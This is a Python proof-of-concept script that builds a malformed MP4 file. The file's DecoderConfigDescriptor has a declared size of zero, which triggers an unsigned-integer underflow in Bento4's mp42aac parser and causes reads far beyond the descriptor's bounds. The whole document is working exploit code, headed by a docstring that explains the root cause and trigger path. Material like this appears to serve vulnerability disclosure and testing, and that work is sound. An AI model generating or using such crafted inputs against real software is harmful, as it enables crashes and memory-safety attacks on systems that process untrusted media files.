#!/usr/bin/env python3
"""
PoC generator for Bento4 mp42aac DecoderConfigDescriptor integer underflow.

Vulnerability: CWE-191 (Integer Underflow / Wrap-Around)
Function: AP4_DecoderConfigDescriptor::AP4_DecoderConfigDescriptor(stream, header_size, payload_size)
File: Source/C++/Core/Ap4DecoderConfigDescriptor.cpp, line 92

Root cause:
    AP4_SubStream* substream = new AP4_SubStream(stream, start+13, payload_size-13);
When payload_size=0 (unsigned uint32), 0-13 wraps to 0xFFFFFFF3 (~4GB),
creating a huge SubStream that reads beyond the descriptor's declared bounds.

Trigger path:
    mp42aac main() -> AP4_File -> AP4_Movie -> AP4_Track
      -> moov/trak/mdia/minf/stbl/stsd/mp4a -> AP4_EsdsAtom
      -> AP4_DescriptorFactory::CreateDescriptorFromStream
      -> AP4_DecoderConfigDescriptor(stream, header_size, payload_size=0)
"""
import struct
import os
import sys


def box(name, data):
    """Build a 32-bit size MP4 box: size(4BE) + type(4) + data"""
    data = bytes(data)
    return struct.pack('>I', 8 + len(data)) + name.encode('latin-1') + data


def fullbox(name, version, flags, data):
    """Build a full box: box header + version(1) + flags(3) + data"""
    data = bytes(data)
    vf = struct.pack('>I', (version << 24) | (flags & 0xFFFFFF))
    return box(name, vf + data)


# ── ftyp ────────────────────────────────────────────────────────────────────
ftyp_data = b'M4A ' + struct.pack('>I', 0) + b'M4A ' + b'isom'
ftyp = box('ftyp', ftyp_data)

# ── mvhd (version=0) ────────────────────────────────────────────────────────
identity_matrix = struct.pack('>9I',
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000)
mvhd_data  = struct.pack('>IIII', 0, 0, 1000, 0)   # times, timescale, duration
mvhd_data += struct.pack('>I', 0x00010000)           # rate = 1.0
mvhd_data += struct.pack('>H', 0x0100)               # volume = 1.0
mvhd_data += struct.pack('>H', 0)                    # reserved
mvhd_data += struct.pack('>II', 0, 0)                # reserved (8 bytes)
mvhd_data += identity_matrix                         # 36 bytes
mvhd_data += struct.pack('>6I', 0, 0, 0, 0, 0, 0)   # pre_defined (24 bytes)
mvhd_data += struct.pack('>I', 2)                    # next_track_id
mvhd = fullbox('mvhd', 0, 0, mvhd_data)

# ── tkhd (version=0, flags=3: enabled + in-movie) ───────────────────────────
tkhd_data  = struct.pack('>IIIII', 0, 0, 1, 0, 0)   # times, track_id, rsvd, duration
tkhd_data += struct.pack('>II', 0, 0)                # reserved (8 bytes)
tkhd_data += struct.pack('>HH', 0, 0)                # layer, alternate_group
tkhd_data += struct.pack('>H', 0x0100)               # volume = 1.0
tkhd_data += struct.pack('>H', 0)                    # reserved
tkhd_data += identity_matrix                         # 36 bytes
tkhd_data += struct.pack('>II', 0, 0)                # width, height (0 for audio)
tkhd = fullbox('tkhd', 0, 3, tkhd_data)

# ── mdhd (version=0) ────────────────────────────────────────────────────────
mdhd_data  = struct.pack('>IIII', 0, 0, 44100, 0)   # times, timescale, duration
mdhd_data += struct.pack('>HH', 0x55C4, 0)           # language="und", pre_defined
mdhd = fullbox('mdhd', 0, 0, mdhd_data)

# ── hdlr ────────────────────────────────────────────────────────────────────
hdlr_data  = struct.pack('>I', 0)                    # pre_defined
hdlr_data += b'soun'                                 # handler_type
hdlr_data += struct.pack('>3I', 0, 0, 0)             # reserved (12 bytes)
hdlr_data += b'SoundHandler\x00'                     # name
hdlr = fullbox('hdlr', 0, 0, hdlr_data)

# ── smhd ────────────────────────────────────────────────────────────────────
smhd = fullbox('smhd', 0, 0, struct.pack('>HH', 0, 0))   # balance, reserved

# ── dinf / dref ─────────────────────────────────────────────────────────────
url_entry = fullbox('url ', 0, 1, b'')               # flags=1: self-contained
dref = fullbox('dref', 0, 0, struct.pack('>I', 1) + url_entry)   # entry_count=1
dinf = box('dinf', dref)

# ══════════════════════════════════════════════════════════════════
# Build the malicious esds atom
#
# Target: AP4_DecoderConfigDescriptor(stream, header_size, payload_size=0)
# at line 92:  payload_size-13 = 0 - 13 = 0xFFFFFFF3  (uint32 underflow)
# ══════════════════════════════════════════════════════════════════

# DecoderConfigDescriptor: tag=0x04, declared size=0x00
# payload_size=0 is the trigger value (< 13 causes underflow in the constructor)
decoder_config_desc = bytes([0x04, 0x00])

# ES_Descriptor payload:
#   es_id       (2 bytes) = 0x0001
#   flags byte  (1 byte)  = 0x00  -> no stream-dependency, no URL, no OCR
#   DecoderConfigDescriptor header (2 bytes)  <- sits in EsDescriptor's SubStream
# Total ES payload = 5 bytes
es_desc_payload = struct.pack('>H', 1) + bytes([0x00]) + decoder_config_desc

# ES_Descriptor: tag=0x03, size=5
es_desc = bytes([0x03, len(es_desc_payload)]) + es_desc_payload

# esds full-box body: version+flags(4) + ES_Descriptor
esds_body = struct.pack('>I', 0) + es_desc
esds = box('esds', esds_body)

# ── mp4a AudioSampleEntry ────────────────────────────────────────────────────
mp4a_data  = bytes(6)                                # reserved
mp4a_data += struct.pack('>H', 1)                    # data_reference_index
mp4a_data += bytes(8)                                # reserved
mp4a_data += struct.pack('>H', 2)                    # channelcount = stereo
mp4a_data += struct.pack('>H', 16)                   # samplesize = 16-bit
mp4a_data += struct.pack('>H', 0)                    # pre_defined
mp4a_data += struct.pack('>H', 0)                    # reserved
mp4a_data += struct.pack('>I', 44100 << 16)          # samplerate (16.16 fixed-point)
mp4a_data += esds                                    # esds box containing the bug trigger
mp4a = box('mp4a', mp4a_data)

# ── stsd ────────────────────────────────────────────────────────────────────
stsd = fullbox('stsd', 0, 0, struct.pack('>I', 1) + mp4a)   # entry_count=1

# ── stts / stsc / stsz / stco (all empty) ───────────────────────────────────
stts = fullbox('stts', 0, 0, struct.pack('>I', 0))
stsc = fullbox('stsc', 0, 0, struct.pack('>I', 0))
stsz = fullbox('stsz', 0, 0, struct.pack('>II', 0, 0))
stco = fullbox('stco', 0, 0, struct.pack('>I', 0))

# ── stbl / minf / mdia / trak / moov ────────────────────────────────────────
stbl = box('stbl', stsd + stts + stsc + stsz + stco)
minf = box('minf', smhd + dinf + stbl)
mdia = box('mdia', mdhd + hdlr + minf)
trak = box('trak', tkhd + mdia)
moov = box('moov', mvhd + trak)

# ── mdat (empty placeholder) ─────────────────────────────────────────────────
mdat = box('mdat', b'')

# ── assemble the file ────────────────────────────────────────────────────────
mp4_bytes = ftyp + moov + mdat

out_dir = os.path.dirname(os.path.abspath(__file__))
out_path = os.path.join(out_dir, 'vuln_001.mp4')
with open(out_path, 'wb') as f:
    f.write(mp4_bytes)

print(f"[+] Generated {out_path} ({len(mp4_bytes)} bytes)")
print(f"[+] esds DecoderConfigDescriptor payload_size=0 triggers uint32 underflow:")
print(f"    payload_size(0) - 13  ==>  0xFFFFFFF3 (~4 GB SubStream)")
